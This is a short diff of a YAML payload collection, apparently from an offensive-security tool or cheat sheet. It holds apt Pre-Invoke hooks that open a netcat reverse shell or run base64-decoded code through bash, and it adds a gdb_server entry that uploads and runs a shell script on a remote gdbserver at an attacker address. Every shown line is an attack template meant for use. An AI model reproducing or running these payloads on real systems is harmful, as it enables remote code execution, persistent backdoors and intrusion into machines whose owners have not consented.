@@ -1457,8 +1457,17 @@ payload:
       echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"};' > /etc/apt/apt.conf.d/pwn
     - |
       echo 'apt::Update::Pre-Invoke {"echo {BASE64} | base64 -d | bash"};' > /etc/apt/apt.conf.d/pwn
-      
-      
+  gdb_server:
+    - |
+      # File Reverse Shell (Local)
+      echo -e '#!/bin/bash\necho {BASE64} | base64 -d | bash' > /tmp/shell.sh
+
+      # Run (Local)
+      gdb
+      target extended-remote <ATTACKER_IP>:<ATTACKER_PORT>
+      remote put /tmp/shell.sh /tmp/shell.sh
+      set remote exec-file /tmp/shell.sh
+      run
       
       
       
